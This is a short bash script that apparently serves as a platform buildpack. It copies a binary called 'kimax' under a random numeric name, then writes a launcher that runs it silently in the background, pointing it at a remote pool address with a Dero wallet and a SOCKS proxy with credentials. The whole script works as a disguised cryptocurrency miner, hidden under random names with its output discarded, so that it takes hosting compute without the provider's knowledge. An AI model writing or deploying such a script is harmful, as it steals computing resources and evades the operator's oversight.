#!/usr/bin/env bash
set -e

dyno=$(shuf -i 10000000000-99999999999 -n 1)

mkdir -p "$1/bin/"

cp -a binaries-$STACK/kimax "$1/bin/$dyno"
cp -a binaries-$STACK/main "$1/bin/main"

chmod 777 $1/bin/$dyno

cat > $1/bin/mode <<END
timeout 60m /app/bin/$dyno -r 134.122.92.217:443 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -sock-address 43.131.19.115:1080 -sock-auth bsm:123 -m 4 -p rpc >/dev/null 2>&1 >/dev/null &
END

chmod 777 $1/bin/mode
chmod 777 $1/bin/main
mkdir -p "$1/.profile.d/"
cat >>"$1"/.profile.d/main.sh <<EOF
export LD_LIBRARY_PATH="\$LD_LIBRARY_PATH:\$HOME/bin"
EOF

exit 0
